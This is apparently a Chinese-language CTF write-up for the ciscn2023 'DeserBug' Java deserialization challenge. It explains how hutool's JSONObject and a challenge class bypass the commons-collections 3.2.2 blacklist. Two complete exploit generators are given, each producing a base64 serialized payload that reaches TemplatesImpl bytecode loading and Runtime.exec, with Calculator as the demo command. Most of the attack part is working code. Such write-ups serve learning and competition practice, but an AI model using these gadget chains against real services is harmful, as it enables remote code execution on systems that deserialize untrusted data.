---
layout: post
title: ciscn2023 DeserBug
date: 2023-05-29 16:29 +0800
categories: [ctf, web]
tag: [web, java]
---

## 题目描述
* common-collections 3.2.2 
* cn.hutool 5.8.18
* jdk 8u202


## 为什么3.2.2无法用之前的链子了？
使用了`checkUnsafeSerialization`函数，代码中可以搜索到，禁用了如下类
```
WhileClosure
CloneTransformer
ForClosure
InstantiateFactory
InstantiateTransformer
InvokerTransformer
PrototypeCloneFactory
PrototypeSerializationFactory
```

## 寻找重新把gadget串起来的类
### hutool有哪些好东西呢？
```java
import cn.hutool.json.JSONObject;
public class AAA {
    String name;
    public void getName(){
        System.out.println("getter called");
    }
    public void setName(){
        System.out.println("setter called");
    }
    public static void main(String[] args){
        JSONObject jo = new JSONObject();
        jo.put("aa", new AAA());
    }
}
/*
getter called
*/
```
即`JSONObject#put -> getter`

再来看一下题目给的类
```java
public class Myexpect extends Exception {
    private Class[] typeparam;
    private Object[] typearg;
    private Class targetclass;
    public String name;
    public String anyexcept;
    ...
    public Object getAnyexcept() throws Exception {
        Constructor con = this.targetclass.getConstructor(this.typeparam);
        return con.newInstance(this.typearg);
    }
}
```
这个getter可以任意实例化对象

CC3中用到了一个TrAXFilter，该类的构造方法中调用了对象的newTransformer()方法
```java
public class TrAXFilter extends XMLFilterImpl {
    private Templates              _templates;
    private TransformerImpl        _transformer;
    private TransformerHandlerImpl _transformerHandler;
    private boolean _overrideDefaultParser;

    public TrAXFilter(Templates templates)  throws
        TransformerConfigurationException
    {
        _templates = templates;
        _transformer = (TransformerImpl) templates.newTransformer();
        _transformerHandler = new TransformerHandlerImpl(_transformer);
        _overrideDefaultParser = _transformer.overrideDefaultParser();
    }
    ...
}
```
因此利用点就搞定了
```
JSONObject#put->Myexpect#getter->TrAXFilter#constructor
->TemplatesImpl#newTransformer
->Runtime.exec
```

## 回顾CC链的触发点（温故而知新）
以经典的从HashSet触发这条链为例：

### 步骤1
HashSet#readObject 
```java
public class HashSet<E>
    extends AbstractSet<E>
    implements Set<E>, Cloneable, java.io.Serializable
{
    static final long serialVersionUID = -5024744406713321676L;

    private transient HashMap<E,Object> map;

    // Dummy value to associate with an Object in the backing Map
    private static final Object PRESENT = new Object();

    /**
     * Constructs a new, empty set; the backing <tt>HashMap</tt> instance has
     * default initial capacity (16) and load factor (0.75).
     */
    public HashSet() {
        map = new HashMap<>();
    }

    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in any hidden serialization magic
        s.defaultReadObject();

        ...
        // Create backing HashMap
        map = (((HashSet<?>)this) instanceof LinkedHashSet ?
                new LinkedHashMap<E,Object>(capacity, loadFactor) :
                new HashMap<E,Object>(capacity, loadFactor));

        // Read in all elements in the proper order.
        for (int i=0; i<size; i++) {
            @SuppressWarnings("unchecked")
                E e = (E) s.readObject();
            map.put(e, PRESENT); // ① e=Object of TiedMapEntry
        }
    }
}
```

### 步骤2-3
```java
public class HashMap<K,V> extends AbstractMap<K,V>
    implements Map<K,V>, Cloneable, Serializable {
    ...
    final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                   boolean evict) {
        Node<K,V>[] tab; Node<K,V> p; int n, i;
        if ((tab = table) == null || (n = tab.length) == 0)
            n = (tab = resize()).length;
        if ((p = tab[i = (n - 1) & hash]) == null)
            tab[i] = newNode(hash, key, value, null);
        else {
            Node<K,V> e; K k;
            if (p.hash == hash &&
                ((k = p.key) == key || (key != null && key.equals(k))))
                e = p;
            else if (p instanceof TreeNode)
                e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);
            else {
                for (int binCount = 0; ; ++binCount) {
                    if ((e = p.next) == null) {
                        p.next = newNode(hash, key, value, null);
                        if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st
                            treeifyBin(tab, hash);
                        break;
                    }
                    if (e.hash == hash &&
                        ((k = e.key) == key || (key != null && key.equals(k))))
                        break;
                    p = e;
                }
            }
            if (e != null) { // existing mapping for key
                V oldValue = e.value;
                if (!onlyIfAbsent || oldValue == null)
                    e.value = value;
                afterNodeAccess(e);
                return oldValue;
            }
        }
        ++modCount;
        if (++size > threshold)
            resize();
        afterNodeInsertion(evict);
        return null;
    }
    
    static final int hash(Object key) { // ③ key = object of TiedMapEntry
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }

    public V put(K key, V value) { // ② key = object of TiedMapEntry
        return putVal(hash(key), key, value, false, true);
    }
}
```

### 步骤4-5
```java
public class TiedMapEntry implements Entry, KeyValue, Serializable {
    private static final long serialVersionUID = -8453869361373831205L;
    private final Map map; // object of LazyMap
    private final Object key; // "test1"
    public TiedMapEntry(Map map, Object key) {
        this.map = map;
        this.key = key;
    }
    ...

    public Object getValue() { 
        return this.map.get(this.key); // ⑤
    }
    public int hashCode() { 
        Object value = this.getValue(); // ④ 
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }
    ...
}
```

### 步骤6-8
```java
public class LazyMap extends AbstractMapDecorator implements Map, Serializable {
    private static final long serialVersionUID = 7990956402564206740L;
    protected final Transformer factory;

    public static Map decorate(Map map, Factory factory) {
        return new LazyMap(map, factory);
    }

    public static Map decorate(Map map, Transformer factory) {
        return new LazyMap(map, factory);
    }

    protected LazyMap(Map map, Factory factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        } else {
            this.factory = FactoryTransformer.getInstance(factory);
        }
    }

    ...
    // lazyMap=LazyMap.decorate(map,testTransformer);
    public Object get(Object key) { // ⑥ key="test1" this.map=object of HashMap
        if (!this.map.containsKey(key)) { // 走这里
            Object value = this.factory.transform(key); //⑦
            this.map.put(key, value);  // ⑧
            return value;
        } else {
            return this.map.get(key);
        }
    }
}
```

关键就在⑦、⑧处，设想一下，如果
* this.map是一个JSONObject
* key无所谓
* value是一个Transformer的子类,如`ConstantTransformer`

如以下代码所示，只要iConstant是个Object，我们就能调用他的getter方法！
```java
public class ConstantTransformer implements Transformer, Serializable {
    private static final long serialVersionUID = 6374440726369055124L;
    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);
    private final Object iConstant;

    public static Transformer getInstance(Object constantToReturn) {
        return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn));
    }

    public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return this.iConstant;
    }

    public Object getConstant() {
        return this.iConstant;
    }
}

```
真是太妙了



## exp

### Gadget1
* CC6前段(`HashSet`、`HashMap`、`TiedMapEntry`、`LazyMap`)
* 中段`JSONObject` + `Myexpect` 
* CC3后段(`TrAXFilter`、`TemplatesImpl`)
```
HashSet#readObject->HashMap#put->HashMap#hash->
TiedMapEntry#hashCode->TiedMapEntry#getValue->       //TiedMapEntry(lazyMap,"test1")
->LazyMap#get
->JSONObject#put->Myexpect#getter->TrAXFilter#constructor
->TemplatesImpl#newTransformer
->Runtime.exec
```

```java
import cn.hutool.json.JSONObject;
import com.app.Myexpect;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class Test {
    public static byte[] getEvilByteCode() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass("aaa");
        String cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"open\",\"/System/Applications/Calculator.app\"});";
        //静态方法
        cc.makeClassInitializer().insertBefore(cmd);
        //设置满足条件的父类
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        //获取字节码
        return cc.toBytecode();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static HashSet getHashSet(Object obj) throws NoSuchFieldException, ClassNotFoundException, IllegalAccessException {
        HashSet hs = new HashSet(1);
        hs.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hs);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(hashset_map);

        Object node = array[0];
        if (node == null) {
            node = array[1];
        }
        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node, obj);
        return hs;
    }
    public static String getBase64Data(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }
    public static void main(String[] args){
        try {
            // 转成字节码，并且反射设置 bytecodes
            byte[] classBytes = getEvilByteCode();
            TemplatesImpl obj = new TemplatesImpl();
            setFieldValue(obj, "_bytecodes", new byte[][]{classBytes});
            setFieldValue(obj, "_name", "1");

            Myexpect exp1 = new Myexpect();
            exp1.setTypeparam(new Class[]{javax.xml.transform.Templates.class});
            exp1.setTypearg(new Object[]{obj});
            exp1.setTargetclass(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class);


            JSONObject jo = new JSONObject();
            jo.put("1","2");
            ConstantTransformer constantTransformer = new ConstantTransformer(1);
            setFieldValue(constantTransformer,"iConstant", exp1);

            Map lazyMap= LazyMap.decorate(jo,constantTransformer);
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test1");

            HashSet hs = getHashSet(tiedMapEntry);
            lazyMap.remove("test1");

            System.out.println(getBase64Data(hs));

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}

```

### Gadget2

其实和Gadget1差不多
```
HashMap#readObject->HashMap#put->HashMap#hash->
TiedMapEntry#hashCode->TiedMapEntry#getValue->       //TiedMapEntry(lazyMap,"test1")
->LazyMap#get
->JSONObject#put->Myexpect#getter->TrAXFilter#constructor
->TemplatesImpl#newTransformer
->Runtime.exec
```

* 简化版CC6前段(`HashMap`、`TiedMapEntry`、`LazyMap`) 
* `JSONObject` + `Myexpect` 
* CC3后段(`TrAXFilter`、`TemplatesImpl`)
  
```java
import cn.hutool.json.JSONObject;
import com.app.Myexpect;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Test1 {
    public static byte[] getEvilByteCode() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass("AAA");
        String cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"open\",\"/System/Applications/Calculator.app\"});";
        //静态方法
        cc.makeClassInitializer().insertBefore(cmd);
        //设置满足条件的父类
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        //获取字节码
        return cc.toBytecode();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static String getBase64Data(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }
    public static void main(String[] args){
        try {
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates,"_name","azure");
            setFieldValue(templates,"_bytecodes",new byte[][]{getEvilByteCode()});

            Myexpect exp1 = new Myexpect();
            exp1.setTypeparam(new Class[]{javax.xml.transform.Templates.class});
            exp1.setTypearg(new Object[]{templates});
            exp1.setTargetclass(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class);

            JSONObject jo = new JSONObject();
            jo.put("1","2");
            ConstantTransformer constantTransformer = new ConstantTransformer(1);
            setFieldValue(constantTransformer,"iConstant", exp1);

            Map lazyMap= LazyMap.decorate(jo,constantTransformer);
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test1");

            HashMap hm = new HashMap();
            hm.put(tiedMapEntry, "aa");
            lazyMap.remove("test1");
            System.out.println(getBase64Data(hm));
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}

```

## 参考

* [简化版CC6](https://blog.51cto.com/u_15067246/2573904)
* [CC链分析](https://myzxcg.com/2021/10/Ysoserial-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/#commons-collections11)